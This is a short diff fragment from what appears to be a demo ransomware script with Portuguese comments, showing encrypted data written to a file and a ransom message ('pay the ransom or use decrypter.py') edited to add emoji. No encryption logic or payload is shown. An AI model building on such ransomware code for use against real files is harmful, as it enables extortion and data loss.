@@ -24,4 +24,4 @@ new_file.write(crypto_data)
 new_file.close()
 
 ## mensagem de resgate
-print("Arquivo criptografado com sucesso! Pague o resgate ou use decrypter.py")
+print("💰 Arquivo criptografado com sucesso! Pague o resgate ou use decrypter.py 🤑")
